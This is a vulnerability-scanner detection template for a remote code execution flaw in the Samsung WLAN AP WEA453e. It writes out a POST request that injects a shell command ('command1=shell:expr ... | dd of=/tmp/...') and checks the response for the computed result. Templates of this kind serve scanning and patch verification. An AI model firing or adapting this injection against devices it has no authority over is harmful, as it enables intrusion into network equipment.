expression: r0()
id: samsung-wlan-ap-wea453e-rce
info:
  author: Print1n(http://print1n.top)
  name: Samsung Wlan AP Wea453e RCE
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      + r2)))
    request:
      body: 'command1=shell:expr {{r1}} %2b {{r2}} | dd of=/tmp/{{r3}}.txt

        '
      method: POST
      path: /(download)/tmp/{{r3}}.txt
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
  r3: randomLowercase(8)
